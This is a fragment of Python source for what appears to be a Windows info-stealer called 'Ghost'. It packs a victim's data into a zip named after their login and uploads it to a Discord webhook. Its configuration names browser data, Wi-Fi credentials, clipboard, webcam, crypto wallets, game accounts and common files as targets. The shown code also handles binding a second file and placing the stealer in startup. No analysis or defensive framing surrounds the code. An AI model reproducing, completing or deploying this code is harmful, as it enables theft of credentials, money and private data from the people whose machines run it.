...
def main(webhook: str):
	...
	_zipfile = os.path.join(localappdata, f'Ghost-Logged-{os.getlogin()}.zip')
	...
	data = {
		"username": "Ghost",
		"avatar_url": "https://cdn.discordapp.com/attachments/1309837159859093524/1310109112901828660/1732424735255.png?ex=67455731&is=674405b1&hm=90f56c773b0fac76a0cbd2443eefbe73feddf1267867cf924cd30d195834e395&"
	}

	_file = f'{localappdata}\\Ghost-Logged-{os.getlogin()}.zip'
	...
	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
		with open(_file, 'rb') as file:
			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Ghost-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def Ghost(webhook: str):
	...
	if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.Ghost")):
